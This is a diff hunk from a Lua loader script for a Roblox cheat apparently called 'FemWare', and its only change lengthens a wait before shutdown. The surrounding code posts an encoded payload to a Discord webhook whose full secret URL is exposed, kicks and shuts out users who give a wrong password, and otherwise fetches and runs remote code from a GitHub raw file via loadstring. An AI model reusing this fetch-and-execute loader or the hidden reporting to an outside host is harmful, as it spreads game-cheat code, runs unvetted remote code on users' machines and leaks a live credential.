@@ -38,7 +38,7 @@ if game.PlaceId == 8343259840 then
         local Final = {Url             = "https://discord.com/api/webhooks/970327068007088198/MrFImQTDW3bLuTn3s8Y4f4tnTw-nZBdXzFkLRtDA5oBSsPgF9cyCS7pBBhA6wzL3HJjX", Body = Encoded, Method = "POST", Headers = Headers}
         Request(Final)
         game.Players.LocalPlayer:Kick("Wrong Password little boy. Get the latest script over FemWare Official, discord.gg/ZaSETw4774")
-        wait(10)
+        wait(15)
         game:Shutdown()
     else
         loadstring(game:HttpGet("https://raw.githubusercontent.com/JackHiggly/RobloxThings/main/FemWare0", true))()
